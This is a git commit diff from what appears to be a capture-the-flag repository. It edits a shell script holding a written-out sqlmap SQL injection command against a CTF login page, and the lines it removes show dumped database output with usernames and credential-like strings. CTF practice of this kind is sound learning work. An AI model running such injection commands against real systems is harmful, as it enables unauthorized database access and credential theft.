d2cfec9b8369c64bf45d7b88e4c9fbf681058ad1
elc1798 <subliminalmau5@gmail.com>
2016-03-22 18:14:24 -0400

    Solve Web F

--- Web-F_300-UNFINISHED/sqlmap_attack.sh
+++ Web-F_300-UNFINISHED/sqlmap_attack.sh
@@ -1,12 +1,1 @@
-sqlmap -u http://web.camsctf.com/15/login.php --data='user=*&pass=*' -p user --random-agent --level=5 --risk=3 --tables --dbms=MySQL --technique=T
-
-# Database: camscsco_web15
-# Table: login3
-# [3 entries]
-# +-------------+--------------+
-# | meowz       | usuario      |
-# +-------------+--------------+
-# | 2gRD3f4sfWf | support      |
-# | B8zPAkFQYN4 | iamjustsenda |
-# | S9Ysfu4xKxU | bobb         |
-# +-------------+--------------+
+sqlmap -u http://web.camsctf.com/15/login.php --data='user=*&pass=*' -p user --random-agent --level=5 --risk=3 --dump --dbms=MySQL --technique=QBT -o --flush-session --threads 1
